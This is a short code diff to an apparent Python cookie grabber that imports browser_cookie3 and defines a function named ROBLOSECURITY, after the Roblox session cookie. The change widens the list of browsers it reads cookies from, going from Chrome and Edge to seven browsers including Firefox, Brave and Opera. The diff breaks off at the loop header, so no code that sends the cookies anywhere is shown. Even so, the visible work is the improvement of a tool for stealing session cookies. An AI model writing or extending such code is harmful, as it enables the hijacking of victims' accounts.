@@ -1,9 +1,6 @@
 import browser_cookie3
 
-PATHS = [
-    'chrome',
-    'edge'
-]
+PATHS = ["chrome", "edge", "firefox", "brave", "opera", "vivaldi", "chromium"]
 
 def ROBLOSECURITY():
     for LOCAL in PATHS:
